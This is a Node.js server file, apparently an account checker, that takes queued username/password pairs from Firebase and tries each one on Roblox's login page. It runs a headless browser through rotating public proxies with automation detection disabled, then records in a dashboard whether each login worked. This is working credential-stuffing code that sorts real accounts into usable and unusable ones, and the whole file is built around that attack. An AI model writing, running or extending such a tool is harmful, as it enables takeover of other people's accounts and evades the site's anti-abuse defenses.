// ============================================================
//  Roblox Account Validator — EXACT SPECIFICATION IMPLEMENTATION
//  Following the user's provided logic 100%
// ============================================================

const express = require("express");
const cors = require("cors");
const path = require("path");
const admin = require("firebase-admin");
const { chromium } = require("playwright");
const fs = require("fs");

// ── Firebase Setup ───────────────────────────────────────────
let serviceAccount;
try {
  if (process.env.FIREBASE_CONFIG) {
    serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
  } else {
    serviceAccount = require("./oren-devs-firebase-adminsdk.json");
  }
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
  });
} catch (err) {
  console.error("Firebase Init Failed:", err.message);
  process.exit(1);
}

const db = admin.firestore();

// ── Express App ──────────────────────────────────────────────
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Ensure screenshots directory exists
const SCREENSHOT_DIR = path.join(__dirname, "debug_screenshots");
if (!fs.existsSync(SCREENSHOT_DIR)) {
  fs.mkdirSync(SCREENSHOT_DIR);
}

// ── Stats Tracking ───────────────────────────────────────────
let stats = {
  processed: 0,
  valid: 0,
  invalid: 0,
  queue: 0,
  processing: 0,
};

// ── EXACT PROXY LIST ─────────────────────────────────────────
const PROXY_LIST = [
  "http://20.210.113.32:80",
  "http://154.16.63.190:80",
  "http://67.43.228.253:25803",
  "http://103.153.154.6:80",
  "http://47.74.152.29:8888",
];

// ── EXACT SELECTORS ──────────────────────────────────────────
const SELECTORS = {
  username: "#login-username",
  password: "#login-password",
  submit: "#login-button",
  error: ".error, .alert, [class*=\"error\"], [class*=\"invalid\"]",
  settings: "span#nav-settings",
  logout: "a.rbx-menu-item.logout-menu-item",
};

// ── Helper Utilities ─────────────────────────────────────────
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function takeScreenshot(page, name) {
  try {
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const filePath = path.join(SCREENSHOT_DIR, `${name}_${timestamp}.png`);
    await page.screenshot({ path: filePath, fullPage: true });
    console.log(`[SCREENSHOT] Saved: ${filePath}`);
    return filePath;
  } catch (e) {
    console.warn(`[SCREENSHOT] Failed: ${e.message}`);
  }
}

// ── EXACT VALIDATE CREDENTIAL FUNCTION ───────────────────────
async function validateCredential(doc) {
  const { id } = doc;
  const { username, password } = doc.data();
  let browser = null;

  try {
    stats.processing = 1;
    
    // Step 1: Select a random proxy IP
    const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
    console.log(`\n[${username}] Starting validation...`);
    console.log(`[${username}] Using proxy: ${proxy}`);

    // Step 2: Open a completely invisible headless Chrome browser connected through that proxy
    browser = await chromium.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-blink-features=AutomationControlled",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        `--proxy-server=${proxy}`,
      ],
    });

    const context = await browser.newContext({
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      viewport: { width: 1280, height: 720 },
      ignoreHTTPSErrors: true,
    });

    const page = await context.newPage();
    page.setDefaultTimeout(120000);
    page.setDefaultNavigationTimeout(120000);

    // Step 3: Navigate to the exact URL
    console.log(`[${username}] Navigating to https://www.roblox.com/login...`);
    
    let navigationSuccess = false;
    let navigationError = null;

    // Try multiple navigation strategies
    const navigationStrategies = [
      { waitUntil: "domcontentloaded", timeout: 90000 },
      { waitUntil: "load", timeout: 90000 },
      { waitUntil: "networkidle", timeout: 90000 },
    ];

    for (const strategy of navigationStrategies) {
      if (navigationSuccess) break;
      try {
        console.log(`[${username}] Attempting navigation with waitUntil: ${strategy.waitUntil}...`);
        await page.goto("https://www.roblox.com/login", strategy);
        navigationSuccess = true;
        console.log(`[${username}] Navigation successful with strategy: ${strategy.waitUntil}`);
      } catch (err) {
        navigationError = err.message;
        console.warn(`[${username}] Navigation failed with ${strategy.waitUntil}: ${err.message}`);
      }
    }

    if (!navigationSuccess) {
      throw new Error(`All navigation strategies failed. Last error: ${navigationError}`);
    }

    // Wait a bit for page to fully settle
    await sleep(2000);

    // Step 4: Wait specifically for the username input field
    console.log(`[${username}] Waiting for username field...`);
    await page.waitForSelector(SELECTORS.username, { timeout: 30000 });
    console.log(`[${username}] Username field found!`);

    // Step 5: Type the username and password
    console.log(`[${username}] Typing username...`);
    await page.type(SELECTORS.username, username, { delay: 50 });
    
    await sleep(500);
    
    console.log(`[${username}] Typing password...`);
    await page.type(SELECTORS.password, password, { delay: 50 });

    await sleep(500);

    // Step 6: Click the login button
    console.log(`[${username}] Clicking login button...`);
    await page.click(SELECTORS.submit);

    // Step 7: Wait for the entire page to fully load with no network activity
    console.log(`[${username}] Waiting for page to fully load...`);
    try {
      await page.waitForLoadState("networkidle", { timeout: 30000 });
      console.log(`[${username}] Page fully loaded (networkidle)!`);
    } catch (e) {
      console.warn(`[${username}] Network idle timeout, checking state anyway...`);
    }

    await sleep(2000);

    // Step 8: CHECK FOR SUCCESS OR FAILURE
    console.log(`[${username}] Checking for success or failure...`);

    // Check for error messages
    const hasError = await page.$(SELECTORS.error);
    
    // Check for settings icon
    const hasSettings = await page.$(SELECTORS.settings);

    console.log(`[${username}] Error element found: ${!!hasError}`);
    console.log(`[${username}] Settings icon found: ${!!hasSettings}`);

    // Step 9: IF ERROR FOUND OR NO SETTINGS ICON
    if (hasError || !hasSettings) {
      console.log(`[${username}] Result: INVALID`);
      
      let errorMessage = "Login failed";
      if (hasError) {
        try {
          errorMessage = await page.evaluate(el => el.innerText, hasError);
        } catch (e) {
          errorMessage = "Error element found but could not extract text";
        }
      }

      stats.invalid++;
      stats.processed++;

      await db.collection("credentials").doc(id).update({
        status: "invalid",
        error: errorMessage.trim(),
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });

      console.log(`[${username}] Updated Firebase: status=invalid, error="${errorMessage.trim()}"`);
    } 
    // Step 10: IF SETTINGS ICON FOUND (LOGIN SUCCESSFUL)
    else {
      console.log(`[${username}] Result: VALID`);
      
      // Click the settings icon
      console.log(`[${username}] Clicking settings icon...`);
      await page.click(SELECTORS.settings);
      
      await sleep(1000);

      // Wait for logout button
      console.log(`[${username}] Waiting for logout button...`);
      await page.waitForSelector(SELECTORS.logout, { timeout: 10000 });
      
      // Click the logout button
      console.log(`[${username}] Clicking logout button...`);
      await page.click(SELECTORS.logout);
      
      // Wait for page to reload
      console.log(`[${username}] Waiting for page to reload...`);
      try {
        await page.waitForLoadState("networkidle", { timeout: 10000 });
      } catch (e) {
        console.warn(`[${username}] Reload timeout, but logout was clicked`);
      }

      stats.valid++;
      stats.processed++;

      await db.collection("credentials").doc(id).update({
        status: "valid",
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });

      console.log(`[${username}] Updated Firebase: status=valid`);
    }

  } catch (err) {
    console.error(`[${username}] Critical Error: ${err.message}`);
    
    stats.invalid++;
    stats.processed++;

    await db.collection("credentials").doc(id).update({
      status: "invalid",
      error: `Critical: ${err.message}`,
      processed_at: admin.firestore.FieldValue.serverTimestamp(),
    });

    console.log(`[${username}] Updated Firebase: status=invalid, error="Critical: ${err.message}"`);
  } finally {
    stats.processing = 0;
    if (browser) {
      await browser.close();
      console.log(`[${username}] Browser closed`);
    }
  }
}

// ── EXACT MAIN VALIDATOR LOOP ────────────────────────────────
async function mainValidatorLoop() {
  console.log(`\n[${new Date().toISOString()}] --- Validator Loop Tick ---`);
  
  try {
    // Look in Firebase 'credentials' collection for documents where status equals "pending"
    const pendingSnapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .get();
    
    stats.queue = pendingSnapshot.size;
    console.log(`[LOOP] Queue size: ${stats.queue}`);

    // Take the first pending document it finds
    const snapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .orderBy("added_at", "asc")
      .limit(1)
      .get();

    if (snapshot.empty) {
      // If no pending documents exist, wait 10 seconds and check again
      console.log("[LOOP] No pending documents found. Waiting 10 seconds...");
    } else {
      // If pending document found, run the credential validation process
      const doc = snapshot.docs[0];
      console.log(`[LOOP] Found pending document: ${doc.id} (${doc.data().username})`);
      
      // Update status to "processing"
      await db.collection("credentials").doc(doc.id).update({ status: "processing" });
      
      // Run validation
      await validateCredential(doc);
    }
  } catch (err) {
    console.error("[LOOP] Error in validator loop:", err.message);
  }

  // Wait 10 seconds before next check
  setTimeout(mainValidatorLoop, 10000);
}

// ── REST API ENDPOINTS ───────────────────────────────────────

app.get("/api/stats", (req, res) => {
  res.json({
    processed: stats.processed,
    valid: stats.valid,
    invalid: stats.invalid,
    queue: stats.queue,
    processing: stats.processing,
    uptime_human: Math.floor(process.uptime()) + "s",
    server_time: new Date().toISOString(),
    system_health: { 
      status: "Operational",
      engine: "Playwright/Chromium",
      proxies_available: PROXY_LIST.length
    }
  });
});

app.get("/api/pending_list", async (req, res) => {
  try {
    const snapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .orderBy("added_at", "asc")
      .limit(20)
      .get();
    
    res.json(snapshot.docs.map(doc => ({ 
      id: doc.id, 
      username: doc.data().username 
    })));
  } catch (err) { 
    console.error("Error fetching pending list:", err);
    res.json([]); 
  }
});

app.get("/api/recent", async (req, res) => {
  try {
    const snapshot = await db.collection("credentials")
      .where("status", "in", ["valid", "invalid"])
      .orderBy("processed_at", "desc")
      .limit(10)
      .get();
    
    res.json(snapshot.docs.map(doc => ({
      id: doc.id,
      username: doc.data().username,
      status: doc.data().status,
      error: doc.data().error || null,
      processed_at: doc.data().processed_at ? { _seconds: doc.data().processed_at.seconds } : null
    })));
  } catch (err) { 
    console.error("Error fetching recent:", err);
    res.json([]); 
  }
});

app.get("/health", (req, res) => res.json({ status: "ok", uptime: process.uptime() }));
app.get("/dashboard", (req, res) => res.sendFile(path.join(__dirname, "public", "dashboard.html")));
app.get("*", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));

app.listen(PORT, () => {
  console.log(`\n${'='.repeat(60)}`);
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
  console.log(`🔐 Passcode: 110312`);
  console.log(`${'='.repeat(60)}\n`);
  mainValidatorLoop();
});
